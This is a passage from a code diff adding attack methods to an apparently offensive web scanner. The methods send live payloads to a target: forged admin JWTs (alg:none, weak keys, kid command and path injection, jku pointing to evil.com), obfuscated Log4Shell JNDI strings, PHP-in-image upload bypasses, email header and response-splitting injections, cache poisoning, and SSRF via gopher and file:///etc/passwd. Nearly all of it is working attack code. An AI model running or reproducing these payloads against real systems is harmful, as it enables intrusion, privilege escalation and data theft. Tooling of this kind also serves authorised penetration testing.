+                print(f"  [+] Cloud: {d['provider']} (Confidence: {d['confidence']}%)")
+                
+        except Exception as e:
+            logger.debug(f"Cloud detection error: {e}")
+        
+        return results
+
+    # ============================================================================
+    # ADDITIONAL SPECIALIZED TESTS
+    # ============================================================================
+    
+    def _test_api_versioning_bypass(self) -> List[Dict[str, Any]]:
+        """Test for unprotected API version endpoints"""
+        results = []
+        print("  [*] Testing API version bypass...")
+        
+        api_versions = [
+            '/v1/', '/v2/', '/v3/', '/v4/',
+            '/api/v1/', '/api/v2/', '/api/v3/',
+            '/api/1/', '/api/2/',
+            '/api/1.0/', '/api/2.0/',
+            '/api/latest/', '/api/beta/', '/api/alpha/',
+            '/api/internal/', '/api/private/',
+            '/api/legacy/', '/api/old/',
+            '/_api/', '/~api/',
+        ]
+        
+        endpoints = [
+            'users', 'admin', 'config', 'settings', 'debug',
+            'health', 'status', 'info', 'docs', 'swagger'
+        ]
+        
+        test_cases = []
+        for version in api_versions:
+            test_cases.append({
+                'headers': {},
+                'path': version,
+                'technique': f'API Version: {version}'
+            })
+            for endpoint in endpoints[:5]:
+                test_cases.append({
+                    'headers': {},
+                    'path': f'{version}{endpoint}',
+                    'technique': f'API: {version}{endpoint}'
+                })
+        
+        batch_results = self._batch_test(test_cases, verbose=False)
+        
+        for r in batch_results:
+            r['category'] = 'API_VERSIONING'
+            if r.get('status') in [200, 201]:
+                results.append(r)
+                if r.get('bypass'):
+                    print(f"  [✓] API endpoint: {r['technique']}")
+        
+        return results
+    
+    def _test_mass_assignment(self) -> List[Dict[str, Any]]:
+        """Test for mass assignment vulnerabilities"""
+        results = []
+        print("  [*] Testing mass assignment...")
+        
+        # Common mass assignment targets
+        dangerous_params = [
+            'admin', 'is_admin', 'isAdmin', 'role', 'roles',
+            'privilege', 'privileges', 'permission', 'permissions',
+            'user_type', 'userType', 'type', 'level', 'access',
+            'verified', 'is_verified', 'active', 'is_active',
+            'approved', 'is_approved', 'status', 'account_type',
+            'balance', 'credit', 'points', 'id', 'user_id',
+            'created_at', 'updated_at', 'password', 'email_verified'
+        ]
+        
+        for param in dangerous_params[:10]:  # Limit tests
+            try:
+                # Test via JSON
+                resp = self._session.post(
+                    self.target,
+                    json={param: True, 'test': 'value'},
+                    timeout=self.timeout,
+                    verify=False
+                )
+                
+                if resp and resp.status_code in [200, 201]:
+                    if param in resp.text.lower():
+                        result = {
+                            'technique': f'Mass Assignment: {param}',
+                            'bypass': True,
+                            'status': resp.status_code,
+                            'reason': f'Parameter {param} accepted in response',
+                            'severity': 'HIGH',
+                            'category': 'MASS_ASSIGNMENT'
+                        }
+                        results.append(result)
+                        print(f"  [!] Mass Assignment: {param} may be vulnerable")
+                        
+            except Exception as e:
+                logger.debug(f"Mass assignment test error: {e}")
+        
+        return results
+    
+    def _test_idor_detection(self) -> List[Dict[str, Any]]:
+        """Test for Insecure Direct Object Reference patterns"""
+        results = []
+        print("  [*] Testing IDOR patterns...")
+        
+        # Common IDOR parameters
+        idor_endpoints = [
+            '/user/1', '/user/2', '/user/100',
+            '/users/1', '/users/2',
+            '/profile/1', '/profile/admin',
+            '/account/1', '/account/2',
+            '/order/1', '/order/1000',
+            '/invoice/1', '/document/1',
+            '/file/1', '/download/1',
+            '/api/user/1', '/api/users/1',
+            '?id=1', '?id=2', '?user_id=1', '?user_id=2',
+            '?uid=1', '?account=1', '?order=1',
+        ]
+        
+        response_sizes = {}
+        
+        for endpoint in idor_endpoints:
+            try:
+                if '?' in endpoint:
+                    url = f"{self.target}{endpoint}"
+                else:
+                    url = f"{self.target}{endpoint}"
+                
+                resp = safe_request(url, timeout=self.timeout)
+                
+                if resp and resp.status_code == 200:
+                    size = len(resp.content)
+                    # Track response sizes to detect enumerable resources
+                    base_endpoint = endpoint.rstrip('0123456789')
+                    if base_endpoint not in response_sizes:
+                        response_sizes[base_endpoint] = []
+                    response_sizes[base_endpoint].append({
+                        'endpoint': endpoint,
+                        'size': size,
+                        'status': resp.status_code
+                    })
+                    
+            except Exception as e:
+                logger.debug(f"IDOR test error: {e}")
+        
+        # Analyze patterns
+        for base, responses in response_sizes.items():
+            if len(responses) >= 2:
+                sizes = [r['size'] for r in responses]
+                # Different sizes might indicate IDOR
+                if len(set(sizes)) > 1 and max(sizes) > 100:
+                    result = {
+                        'technique': f'IDOR Pattern: {base}',
+                        'bypass': True,
+                        'status': 200,
+                        'reason': f'Enumerable endpoint with varying responses',
+                        'severity': 'MEDIUM',
+                        'category': 'IDOR',
+                        'details': {'responses': responses}
+                    }
+                    results.append(result)
+                    print(f"  [!] IDOR: {base} shows enumerable pattern")
+        
+        return results
+    
+    def _test_business_logic_flaws(self) -> List[Dict[str, Any]]:
+        """Test for common business logic vulnerabilities"""
+        results = []
+        print("  [*] Testing business logic flaws...")
+        
+        # Negative value tests
+        negative_tests = [
+            ('?amount=-1', 'Negative amount'),
+            ('?quantity=-100', 'Negative quantity'),
+            ('?price=-50', 'Negative price'),
+            ('?count=-1', 'Negative count'),
+            ('?discount=200', 'Over 100% discount'),
+            ('?discount=-50', 'Negative discount'),
+        ]
+        
+        # Boundary tests
+        boundary_tests = [
+            ('?amount=0', 'Zero amount'),
+            ('?amount=0.001', 'Micro amount'),
+            ('?amount=99999999999', 'Large amount'),
+            ('?quantity=0', 'Zero quantity'),
+            ('?price=0', 'Zero price'),
+        ]
+        
+        # Type confusion
+        type_tests = [
+            ('?amount[]=1', 'Array injection'),
+            ('?amount=null', 'Null value'),
+            ('?amount=undefined', 'Undefined value'),
+            ('?amount=NaN', 'NaN value'),
+            ('?amount=true', 'Boolean value'),
+        ]
+        
+        all_tests = negative_tests + boundary_tests + type_tests
+        
+        test_cases = [
+            {'headers': {}, 'path': path, 'technique': f'Logic: {technique}'}
+            for path, technique in all_tests
+        ]
+        
+        batch_results = self._batch_test(test_cases, verbose=False)
+        
+        for r in batch_results:
+            r['category'] = 'BUSINESS_LOGIC'
+            if r.get('status') in [200, 201]:
+                results.append(r)
+                if r.get('bypass'):
+                    print(f"  [!] Logic flaw: {r['technique']}")
+        
+        return results
+    
+    def _test_email_header_injection(self) -> List[Dict[str, Any]]:
+        """Test for email header injection in contact forms"""
+        results = []
+        print("  [*] Testing email header injection...")
+        
+        # Common form endpoints
+        form_endpoints = [
+            '/contact', '/contact-us', '/send', '/mail', '/email',
+            '/feedback', '/support', '/enquiry', '/inquiry', '/message'
+        ]
+        
+        # Email injection payloads
+        injection_payloads = [
+            'test@test.com%0ABcc:evil@evil.com',
+            'test@test.com\r\nBcc:evil@evil.com',
+            'test@test.com%0ACc:evil@evil.com',
+            'test@test.com\nSubject:Injected',
+            'test@test.com%0AContent-Type:text/html',
+        ]
+        
+        for endpoint in form_endpoints:
+            for payload in injection_payloads[:3]:
+                try:
+                    resp = self._session.post(
+                        f"{self.target}{endpoint}",
+                        data={
+                            'email': payload,
+                            'name': 'test',
+                            'message': 'test',
+                            'subject': 'test'
+                        },
+                        timeout=self.timeout,
+                        verify=False
+                    )
+                    
+                    if resp and resp.status_code in [200, 302]:
+                        # Check for injection acceptance
+                        if 'thank' in resp.text.lower() or 'success' in resp.text.lower() or resp.status_code == 302:
+                            result = {
+                                'technique': f'Email Injection: {endpoint}',
+                                'bypass': True,
+                                'status': resp.status_code,
+                                'reason': 'Form accepted potentially malicious email',
+                                'severity': 'MEDIUM',
+                                'category': 'EMAIL_INJECTION'
+                            }
+                            results.append(result)
+                            print(f"  [!] Email injection possible at {endpoint}")
+                            break
+                            
+                except Exception as e:
+                    logger.debug(f"Email injection test error: {e}")
+        
+        return results
+    
+    def _test_file_upload_bypass(self) -> List[Dict[str, Any]]:
+        """Test for file upload restriction bypasses"""
+        results = []
+        print("  [*] Testing file upload bypasses...")
+        
+        # Common upload endpoints
+        upload_endpoints = [
+            '/upload', '/api/upload', '/file/upload', '/files',
+            '/attachments', '/media', '/images', '/documents'
+        ]
+        
+        # Bypass techniques (filename, content-type, description)
+        bypass_tests = [
+            ('test.php', 'image/jpeg', 'PHP as JPEG'),
+            ('test.php.jpg', 'image/jpeg', 'Double extension'),
+            ('test.jpg.php', 'image/jpeg', 'Reverse double ext'),
+            ('test.pHp', 'application/x-php', 'Case variation'),
+            ('test.php%00.jpg', 'image/jpeg', 'Null byte'),
+            ('test.php;.jpg', 'image/jpeg', 'Semicolon bypass'),
+            ('test.php::$DATA', 'application/octet-stream', 'NTFS ADS'),
+            ('test.phtml', 'text/html', 'Alternative PHP ext'),
+            ('test.php5', 'application/x-php', 'PHP5 extension'),
+            ('test.shtml', 'text/html', 'SSI extension'),
+            ('.htaccess', 'text/plain', 'Apache config'),
+            ('test.svg', 'image/svg+xml', 'SVG (XSS)'),
+        ]
+        
+        fake_php_content = b'<?php echo "test"; ?>'
+        fake_image_header = b'\xff\xd8\xff\xe0'  # JPEG magic bytes
+        
+        for endpoint in upload_endpoints[:3]:
+            for filename, content_type, technique in bypass_tests[:5]:
+                try:
+                    # Create payload with magic bytes + PHP
+                    content = fake_image_header + fake_php_content
+                    
+                    files = {
+                        'file': (filename, content, content_type)
+                    }
+                    
+                    resp = self._session.post(
+                        f"{self.target}{endpoint}",
+                        files=files,
+                        timeout=self.timeout,
+                        verify=False
+                    )
+                    
+                    if resp and resp.status_code in [200, 201]:
+                        if 'success' in resp.text.lower() or 'uploaded' in resp.text.lower():
+                            result = {
+                                'technique': f'Upload Bypass: {technique}',
+                                'bypass': True,
+                                'status': resp.status_code,
+                                'reason': f'File {filename} accepted at {endpoint}',
+                                'severity': 'HIGH',
+                                'category': 'FILE_UPLOAD'
+                            }
+                            results.append(result)
+                            print(f"  [✓] Upload bypass: {technique} at {endpoint}")
+                            
+                except Exception as e:
+                    logger.debug(f"Upload test error: {e}")
+        
+        return results
+    
+    def _test_response_splitting(self) -> List[Dict[str, Any]]:
+        """Test for HTTP response splitting"""
+        results = []
+        print("  [*] Testing HTTP response splitting...")
+        
+        # Response splitting payloads
+        split_payloads = [
+            ('?lang=en%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1%20200%20OK', 'Basic split'),
+            ('?redirect=%0d%0aSet-Cookie:evil=value', 'Cookie injection'),
+            ('?next=%0d%0aLocation:%20http://evil.com', 'Location injection'),
+            ('?callback=%0d%0a%0d%0a<html>injected</html>', 'Body injection'),
+        ]
+        
+        test_cases = [
+            {'headers': {}, 'path': path, 'technique': f'Response Split: {technique}'}
+            for path, technique in split_payloads
+        ]
+        
+        batch_results = self._batch_test(test_cases)
+        for r in batch_results:
+            r['category'] = 'RESPONSE_SPLITTING'
+            results.append(r)
+        
+        return results
+    
+    def _test_clickjacking(self) -> List[Dict[str, Any]]:
+        """Test for clickjacking vulnerabilities"""
+        results = []
+        print("  [*] Testing clickjacking protection...")
+        
+        try:
+            resp = safe_request(self.target, timeout=self.timeout, allow_redirects=True)
+            if not resp:
+                return results
+            
+            headers_lower = {k.lower(): v for k, v in resp.headers.items()}
+            
+            # Check X-Frame-Options
+            xfo = headers_lower.get('x-frame-options', '').upper()
+            
+            # Check CSP frame-ancestors
+            csp = headers_lower.get('content-security-policy', '')
+            has_frame_ancestors = 'frame-ancestors' in csp.lower()
+            
+            vulnerable = False
+            reason = ""
+            
+            if not xfo and not has_frame_ancestors:
+                vulnerable = True
+                reason = "No X-Frame-Options or CSP frame-ancestors"
+            elif xfo and xfo not in ['DENY', 'SAMEORIGIN']:
+                if 'ALLOW-FROM' in xfo:
+                    vulnerable = True
+                    reason = f"Deprecated ALLOW-FROM: {xfo}"
+            
+            if vulnerable:
+                result = {
+                    'technique': 'Clickjacking Vulnerability',
+                    'bypass': True,
+                    'status': resp.status_code,
+                    'reason': reason,
+                    'severity': 'MEDIUM',
+                    'category': 'CLICKJACKING'
+                }
+                results.append(result)
+                print(f"  [!] Clickjacking: {reason}")
+            else:
+                result = {
+                    'technique': 'Clickjacking Protection',
+                    'bypass': False,
+                    'status': resp.status_code,
+                    'reason': f"Protected: XFO={xfo or 'N/A'}, CSP frame-ancestors={has_frame_ancestors}",
+                    'severity': 'INFO',
+                    'category': 'CLICKJACKING'
+                }
+                results.append(result)
+                
+        except Exception as e:
+            logger.debug(f"Clickjacking test error: {e}")
+        
+        return results
+
+    # ============================================================================
+    # ADVANCED PROTOCOL ATTACKS (v1.4)
+    # ============================================================================
+    
+    def _test_graphql_deep_testing(self) -> List[Dict[str, Any]]:
+        """Advanced GraphQL security testing - introspection, batching DoS, depth bypass"""
+        results = []
+        print("  [*] Testing advanced GraphQL attacks...")
+        
+        graphql_endpoints = [
+            '/graphql', '/api/graphql', '/v1/graphql', '/gql',
+            '/query', '/api/query', '/graphiql', '/playground'
+        ]
+        
+        # Introspection query to dump entire schema
+        introspection_query = '''
+        query IntrospectionQuery {
+            __schema {
+                queryType { name }
+                mutationType { name }
+                subscriptionType { name }
+                types {
+                    ...FullType
+                }
+                directives {
+                    name
+                    description
+                    locations
+                    args { ...InputValue }
+                }
+            }
+        }
+        fragment FullType on __Type {
+            kind
+            name
+            description
+            fields(includeDeprecated: true) {
+                name
+                description
+                args { ...InputValue }
+                type { ...TypeRef }
+                isDeprecated
+                deprecationReason
+            }
+            inputFields { ...InputValue }
+            interfaces { ...TypeRef }
+            enumValues(includeDeprecated: true) {
+                name
+                description
+                isDeprecated
+                deprecationReason
+            }
+            possibleTypes { ...TypeRef }
+        }
+        fragment InputValue on __InputValue {
+            name
+            description
+            type { ...TypeRef }
+            defaultValue
+        }
+        fragment TypeRef on __Type {
+            kind
+            name
+            ofType {
+                kind
+                name
+                ofType {
+                    kind
+                    name
+                    ofType {
+                        kind
+                        name
+                    }
+                }
+            }
+        }
+        '''
+        
+        # Batching attack - multiple operations in one request
+        batching_query = [
+            {"query": "query { __typename }"},
+            {"query": "query { __typename }"},
+            {"query": "query { __typename }"},
+            {"query": "query { __typename }"},
+            {"query": "query { __typename }"},
+        ] * 20  # 100 queries
+        
+        # Deep nesting attack (depth limit bypass)
+        depth_query = '''
+        query {
+            user {
+                friends {
+                    friends {
+                        friends {
+                            friends {
+                                friends {
+                                    friends {
+                                        friends {
+                                            friends {
+                                                friends {
+                                                    friends {
+                                                        id
+                                                    }
+                                                }
+                                            }
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }
+        '''
+        
+        # Alias-based DoS
+        alias_query = "query { " + " ".join([f"a{i}: __typename" for i in range(1000)]) + " }"
+        
+        # Circular fragment attack
+        circular_query = '''
+        fragment A on Query { ...B }
+        fragment B on Query { ...A }
+        query { ...A }
+        '''
+        
+        # Field suggestion exploitation
+        field_suggestion_query = '''
+        query {
+            __type(name: "User") {
+                fields {
+                    name
+                    type { name kind }
+                }
+            }
+        }
+        '''
+        
+        for endpoint in graphql_endpoints:
+            url = f"{self.target}{endpoint}"
+            
+            # Test introspection
+            try:
+                resp = self._session.post(
+                    url,
+                    json={'query': introspection_query},
+                    headers={'Content-Type': 'application/json'},
+                    timeout=self.timeout,
+                    verify=False
+                )
+                
+                if resp and resp.status_code == 200:
+                    if '__schema' in resp.text or 'queryType' in resp.text:
+                        result = {
+                            'technique': f'GraphQL Introspection: {endpoint}',
+                            'bypass': True,
+                            'status': resp.status_code,
+                            'reason': 'Full schema introspection enabled - exposes all types and fields',
+                            'severity': 'HIGH',
+                            'category': 'GRAPHQL_ATTACK'
+                        }
+                        results.append(result)
+                        print(f"  [✓] GraphQL Introspection enabled at {endpoint}")
+                        
+            except Exception as e:
+                logger.debug(f"GraphQL introspection error: {e}")
+            
+            # Test batching
+            try:
+                resp = self._session.post(
+                    url,
+                    json=batching_query[:10],  # Test with 10 first
+                    headers={'Content-Type': 'application/json'},
+                    timeout=self.timeout + 5,
+                    verify=False
+                )
+                
+                if resp and resp.status_code == 200:
+                    if isinstance(resp.json(), list):
+                        result = {
+                            'technique': f'GraphQL Batching DoS: {endpoint}',
+                            'bypass': True,
+                            'status': resp.status_code,
+                            'reason': 'Query batching enabled - potential DoS vector',
+                            'severity': 'MEDIUM',
+                            'category': 'GRAPHQL_ATTACK'
+                        }
+                        results.append(result)
+                        print(f"  [!] GraphQL Batching enabled at {endpoint}")
+                        
+            except Exception as e:
+                logger.debug(f"GraphQL batching error: {e}")
+            
+            # Test depth limit
+            try:
+                resp = self._session.post(
+                    url,
+                    json={'query': depth_query},
+                    headers={'Content-Type': 'application/json'},
+                    timeout=self.timeout,
+                    verify=False
+                )
+                
+                if resp and resp.status_code == 200:
+                    if 'errors' not in resp.text.lower() or 'depth' not in resp.text.lower():
+                        result = {
+                            'technique': f'GraphQL Depth Bypass: {endpoint}',
+                            'bypass': True,
+                            'status': resp.status_code,
+                            'reason': 'No depth limit enforced - nested query DoS possible',
+                            'severity': 'MEDIUM',
+                            'category': 'GRAPHQL_ATTACK'
+                        }
+                        results.append(result)
+                        
+            except Exception as e:
+                logger.debug(f"GraphQL depth error: {e}")
+        
+        return results
+    
+    def _test_jwt_attacks(self) -> List[Dict[str, Any]]:
+        """Comprehensive JWT attack testing - algorithm confusion, key injection"""
+        results = []
+        print("  [*] Testing JWT/Token attacks...")
+        
+        import base64
+        import hmac
+        
+        # Get a sample response to find JWT tokens
+        try:
+            resp = safe_request(self.target, timeout=self.timeout, allow_redirects=True)
+            if not resp:
+                return results
+            
+            # Look for JWTs in response
+            jwt_pattern = re.compile(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*')
+            found_jwts = jwt_pattern.findall(resp.text)
+            
+            # Check cookies for JWTs
+            for cookie in resp.cookies:
+                if jwt_pattern.match(str(cookie.value)):
+                    found_jwts.append(cookie.value)
+            
+            # Check headers
+            for header_value in resp.headers.values():
+                matches = jwt_pattern.findall(header_value)
+                found_jwts.extend(matches)
+                
+        except Exception as e:
+            logger.debug(f"JWT discovery error: {e}")
+            found_jwts = []
+        
+        # JWT attack payloads
+        jwt_attacks = []
+        
+        # Algorithm None attack
+        none_header = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').decode().rstrip('=')
+        none_payload = base64.urlsafe_b64encode(b'{"sub":"admin","role":"admin"}').decode().rstrip('=')
+        none_jwt = f"{none_header}.{none_payload}."
+        jwt_attacks.append(('alg:none', none_jwt))
+        
+        # Algorithm None variations
+        for alg in ['None', 'NONE', 'nOnE']:
+            header = base64.urlsafe_b64encode(f'{{"alg":"{alg}","typ":"JWT"}}'.encode()).decode().rstrip('=')
+            jwt_attacks.append((f'alg:{alg}', f"{header}.{none_payload}."))
+        
+        # Empty signature
+        hs256_header = base64.urlsafe_b64encode(b'{"alg":"HS256","typ":"JWT"}').decode().rstrip('=')
+        jwt_attacks.append(('empty_sig', f"{hs256_header}.{none_payload}."))
+        
+        # Weak key signatures (common passwords)
+        weak_keys = ['secret', 'password', '123456', 'key', 'private', 'jwt_secret']
+        for key in weak_keys:
+            try:
+                message = f"{hs256_header}.{none_payload}"
+                signature = base64.urlsafe_b64encode(
+                    hmac.new(key.encode(), message.encode(), 'sha256').digest()
+                ).decode().rstrip('=')
+                jwt_attacks.append((f'weak_key:{key}', f"{message}.{signature}"))
+            except:
+                pass
+        
+        # KID injection attacks
+        kid_injections = [
+            ('kid_sqli', '{"alg":"HS256","typ":"JWT","kid":"key\' OR \'1\'=\'1"}'),
+            ('kid_traversal', '{"alg":"HS256","typ":"JWT","kid":"../../etc/passwd"}'),
+            ('kid_devnull', '{"alg":"HS256","typ":"JWT","kid":"/dev/null"}'),
+            ('kid_rce', '{"alg":"HS256","typ":"JWT","kid":"| whoami"}'),
+        ]
+        
+        for name, header_json in kid_injections:
+            header = base64.urlsafe_b64encode(header_json.encode()).decode().rstrip('=')
+            jwt_attacks.append((name, f"{header}.{none_payload}."))
+        
+        # JKU/X5U injection (SSRF via JWT)
+        jku_header = base64.urlsafe_b64encode(
+            b'{"alg":"RS256","typ":"JWT","jku":"http://evil.com/jwks.json"}'
+        ).decode().rstrip('=')
+        jwt_attacks.append(('jku_ssrf', f"{jku_header}.{none_payload}."))
+        
+        x5u_header = base64.urlsafe_b64encode(
+            b'{"alg":"RS256","typ":"JWT","x5u":"http://evil.com/cert.pem"}'
+        ).decode().rstrip('=')
+        jwt_attacks.append(('x5u_ssrf', f"{x5u_header}.{none_payload}."))
+        
+        # Test endpoints with JWT attacks
+        auth_endpoints = [
+            '/api/user', '/api/profile', '/api/me', '/api/account',
+            '/user', '/profile', '/dashboard', '/admin'
+        ]
+        
+        for attack_name, jwt_token in jwt_attacks:
+            for endpoint in auth_endpoints[:3]:  # Limit to avoid too many requests
+                try:
+                    headers = {
+                        'Authorization': f'Bearer {jwt_token}',
+                        'Cookie': f'token={jwt_token}; jwt={jwt_token}'
+                    }
+                    
+                    resp = safe_request(
+                        f"{self.target}{endpoint}",
+                        timeout=self.timeout,
+                        headers=headers
+                    )
+                    
+                    if resp and resp.status_code in [200, 201]:
+                        # Check if we got authenticated
+                        if any(x in resp.text.lower() for x in ['admin', 'user', 'profile', 'dashboard']):
+                            severity = 'CRITICAL' if 'none' in attack_name.lower() else 'HIGH'
+                            result = {
+                                'technique': f'JWT Attack: {attack_name}',
+                                'bypass': True,
+                                'status': resp.status_code,
+                                'reason': f'JWT accepted at {endpoint}',
+                                'severity': severity,
+                                'category': 'JWT_ATTACK'
+                            }
+                            results.append(result)
+                            print(f"  [✓] JWT Attack: {attack_name} successful")
+                            break
+                            
+                except Exception as e:
+                    logger.debug(f"JWT attack error: {e}")
+        
+        # Report found JWTs
+        if found_jwts:
+            result = {
+                'technique': 'JWT Token Discovery',
+                'bypass': False,
+                'status': 200,
+                'reason': f'Found {len(found_jwts)} JWT token(s) in response',
+                'severity': 'INFO',
+                'category': 'JWT_ATTACK',
+                'details': {'tokens_found': len(found_jwts)}
+            }
+            results.append(result)
+        
+        return results
+    
+    def _test_web_cache_deception(self) -> List[Dict[str, Any]]:
+        """Web Cache Deception attacks - trick caching of sensitive pages"""
+        results = []
+        print("  [*] Testing Web Cache Deception...")
+        
+        # Sensitive endpoints to test
+        sensitive_endpoints = [
+            '/account', '/profile', '/user', '/settings', '/dashboard',
+            '/api/user', '/api/me', '/myaccount', '/my-account'
+        ]
+        
+        # Cache deception payloads (appending static file extensions)
+        deception_suffixes = [
+            '.css', '.js', '.png', '.jpg', '.gif', '.ico', '.svg',
+            '.woff', '.woff2', '.ttf', '.eot',
+            '/test.css', '/test.js', '/logo.png', '/style.css',
+            '/nonexistent.css', '%2f..%2ftest.css',
+            ';test.css', '?.css', '#.css'
+        ]
+        
+        for endpoint in sensitive_endpoints:
+            for suffix in deception_suffixes[:5]:  # Limit suffixes
+                try:
+                    # First request - potentially cached
+                    url = f"{self.target}{endpoint}{suffix}"
+                    resp1 = safe_request(url, timeout=self.timeout, allow_redirects=False)
+                    
+                    if resp1 and resp1.status_code == 200:
+                        # Check cache headers
+                        cache_control = resp1.headers.get('Cache-Control', '').lower()
+                        x_cache = resp1.headers.get('X-Cache', '').lower()
+                        cf_cache = resp1.headers.get('CF-Cache-Status', '').lower()
+                        age = resp1.headers.get('Age', '')
+                        
+                        # Determine if response was cached
+                        is_cached = any([
+                            'hit' in x_cache,
+                            'hit' in cf_cache,
+                            age and int(age) > 0,
+                            'public' in cache_control,
+                            'max-age' in cache_control and 'private' not in cache_control
+                        ])
+                        
+                        # Check if sensitive content in response
+                        has_sensitive = any(x in resp1.text.lower() for x in [
+                            'email', 'username', 'password', 'token', 'session',
+                            'account', 'balance', 'credit', 'ssn', 'phone'
+                        ])
+                        
+                        if is_cached and has_sensitive:
+                            result = {
+                                'technique': f'Web Cache Deception: {endpoint}{suffix}',
+                                'bypass': True,
+                                'status': resp1.status_code,
+                                'reason': 'Sensitive page cached with static extension',
+                                'severity': 'HIGH',
+                                'category': 'CACHE_DECEPTION',
+                                'details': {
+                                    'cache_control': cache_control,
+                                    'x_cache': x_cache,
+                                    'cf_cache': cf_cache
+                                }
+                            }
+                            results.append(result)
+                            print(f"  [✓] Cache Deception: {endpoint}{suffix}")
+                            
+                except Exception as e:
+                    logger.debug(f"Cache deception error: {e}")
+        
+        # Test cache key poisoning via unkeyed headers
+        poison_headers = [
+            {'X-Forwarded-Host': 'evil.com'},
+            {'X-Original-URL': '/admin'},
+            {'X-Rewrite-URL': '/admin'},
+            {'X-Forwarded-Scheme': 'nothttps'},
+        ]
+        
+        for headers in poison_headers:
+            try:
+                resp = safe_request(
+                    f"{self.target}/?cb={int(time.time())}",
+                    timeout=self.timeout,
+                    headers=headers
+                )
+                
+                if resp:
+                    header_name = list(headers.keys())[0]
+                    header_value = list(headers.values())[0]
+                    
+                    if header_value in resp.text:
+                        result = {
+                            'technique': f'Cache Key Poison: {header_name}',
+                            'bypass': True,
+                            'status': resp.status_code,
+                            'reason': f'Unkeyed header {header_name} reflected',
+                            'severity': 'MEDIUM',
+                            'category': 'CACHE_DECEPTION'
+                        }
+                        results.append(result)
+                        print(f"  [!] Cache Poison: {header_name} reflected")
+                        
+            except Exception as e:
+                logger.debug(f"Cache poison error: {e}")
+        
+        return results
+    
+    def _test_log4shell_patterns(self) -> List[Dict[str, Any]]:
+        """Test for Log4Shell (CVE-2021-44228) and similar JNDI injection patterns"""
+        results = []
+        print("  [*] Testing Log4Shell/JNDI injection patterns...")
+        
+        # JNDI payload patterns (detection only - no actual callbacks)
+        jndi_payloads = [
+            # Standard Log4Shell
+            '${jndi:ldap://test.com/a}',
+            '${jndi:rmi://test.com/a}',
+            '${jndi:dns://test.com/a}',
+            
+            # Obfuscation bypasses
+            '${${lower:j}ndi:ldap://test.com/a}',
+            '${${upper:j}ndi:ldap://test.com/a}',
+            '${${::-j}${::-n}${::-d}${::-i}:ldap://test.com/a}',
+            '${j${::-n}di:ldap://test.com/a}',
+            '${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap://test.com/a}',
+            
+            # Nested lookups
+            '${${lower:${lower:jndi}}:ldap://test.com/a}',
+            '${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://test.com/a}',
+            
+            # URL encoding variations
+            '%24%7Bjndi%3Aldap%3A%2F%2Ftest.com%2Fa%7D',
+            
+            # Unicode variations
+            '${jn${::-d}i:ldap://test.com/a}',
+        ]
+        
+        # Injection points
+        injection_vectors = [
+            ('query', f"?test=PAYLOAD"),
+            ('header_ua', 'User-Agent'),
+            ('header_ref', 'Referer'),
+            ('header_xff', 'X-Forwarded-For'),
+            ('header_custom', 'X-Api-Version'),
+            ('header_accept', 'Accept-Language'),
+        ]
+        
+        for payload in jndi_payloads[:6]:  # Limit payloads
+            encoded_payload = quote(payload)
+            
+            # Test in query parameter
+            try:
+                resp = safe_request(
+                    f"{self.target}/?test={encoded_payload}",
+                    timeout=self.timeout
+                )
+                
+                if resp and resp.status_code in [200, 500, 502, 503]:
+                    # Check for error indicators that might suggest JNDI lookup attempt
+                    error_indicators = [
+                        'jndi', 'lookup', 'naming', 'javax.naming',
+                        'connection refused', 'unknown host', 'timeout'
+                    ]
+                    
+                    if any(ind in resp.text.lower() for ind in error_indicators):
+                        result = {
+                            'technique': f'Log4Shell: Query Parameter',
+                            'bypass': True,
+                            'status': resp.status_code,
+                            'reason': 'JNDI lookup indicators in response',
+                            'severity': 'CRITICAL',
+                            'category': 'LOG4SHELL'
+                        }
+                        results.append(result)
+                        print(f"  [✓] CRITICAL: Potential Log4Shell in query param")
+                        break
+                        
+            except Exception as e:
+                logger.debug(f"Log4Shell query test error: {e}")
+            
+            # Test in headers
+            for vector_name, header_name in injection_vectors[1:]:
+                try:
+                    headers = {header_name: payload}
+                    resp = safe_request(
+                        self.target,
+                        timeout=self.timeout,
+                        headers=headers
+                    )
+                    
+                    if resp and resp.status_code in [200, 500, 502, 503]:
+                        if any(ind in resp.text.lower() for ind in ['jndi', 'lookup', 'naming']):
+                            result = {
+                                'technique': f'Log4Shell: {header_name}',
+                                'bypass': True,
+                                'status': resp.status_code,
+                                'reason': f'JNDI indicators via {header_name}',
+                                'severity': 'CRITICAL',
+                                'category': 'LOG4SHELL'
+                            }
+                            results.append(result)
+                            print(f"  [✓] CRITICAL: Potential Log4Shell in {header_name}")
+                            
+                except Exception as e:
+                    logger.debug(f"Log4Shell header test error: {e}")
+        
+        # Test POST body
+        try:
+            resp = self._session.post(
+                self.target,
+                data={'test': '${jndi:ldap://test.com/a}'},
+                timeout=self.timeout,
+                verify=False
+            )
+            
+            if resp and 'jndi' in resp.text.lower():
+                result = {
+                    'technique': 'Log4Shell: POST Body',
+                    'bypass': True,
+                    'status': resp.status_code,
+                    'reason': 'JNDI indicators in POST response',
+                    'severity': 'CRITICAL',
+                    'category': 'LOG4SHELL'
+                }
+                results.append(result)
+                
+        except Exception as e:
+            logger.debug(f"Log4Shell POST error: {e}")
+        
+        return results
+    
+    def _test_ssrf_protocol_smuggling(self) -> List[Dict[str, Any]]:
+        """Advanced SSRF with protocol smuggling - gopher, dict, file, ldap"""
+        results = []
+        print("  [*] Testing SSRF protocol smuggling...")
+        
+        # Protocol smuggling payloads
+        ssrf_protocols = [
+            # Gopher protocol (for Redis, SMTP, etc.)
+            ('gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aINFO%0d%0a', 'Gopher Redis'),
+            ('gopher://127.0.0.1:11211/_stats', 'Gopher Memcached'),
+            ('gopher://127.0.0.1:25/_HELO%20localhost', 'Gopher SMTP'),
+            
+            # Dict protocol
+            ('dict://127.0.0.1:6379/INFO', 'Dict Redis'),
+            ('dict://127.0.0.1:11211/stats', 'Dict Memcached'),
+            
+            # File protocol
+            ('file:///etc/passwd', 'File /etc/passwd'),
+            ('file:///c:/windows/win.ini', 'File win.ini'),
+            ('file://localhost/etc/passwd', 'File localhost'),
+            
+            # LDAP protocol
